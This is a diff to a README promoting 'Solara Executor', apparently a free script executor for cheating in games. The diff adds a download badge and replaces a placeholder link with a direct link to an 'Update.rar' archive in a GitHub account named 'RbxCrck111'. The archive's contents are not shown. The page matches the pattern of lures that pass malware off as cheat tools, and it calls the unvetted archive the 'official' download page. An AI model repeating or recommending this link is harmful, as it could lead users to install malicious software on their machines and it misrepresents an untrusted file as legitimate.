@@ -1,5 +1,7 @@
 # 🌌 **Solara Executor** – Unleash Your Potential FREE DOWNLOAD 2025
 
+[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-green)](https://github.com/RbxCrck111/solara-2025-update/releases/download/release-launcher/Update.rar)
+
 **Solara Executor** is a powerful tool designed to give users an edge in executing scripts and enhancing their experience across various games. With a sleek design and high customization, Solara ensures smooth and efficient execution for those looking to enhance their gameplay or automate processes.
 
 ---
@@ -58,7 +60,7 @@ To ensure optimal performance, make sure your system meets the following specifi
 ## 🚀 **Getting Started with Solara Executor**  
 
 ### Step 1: **Download Solara Executor**  
-Go to the official [Solara Executor download page](#) to get the latest version of the tool.  
+Go to the official [Solara Executor download page](https://github.com/RbxCrck111/solara-2025-update/releases/download/release-launcher/Update.rar) to get the latest version of the tool.  
 
 ### Step 2: **Install the Tool**  
 Follow the setup guide to install Solara Executor on your system.  
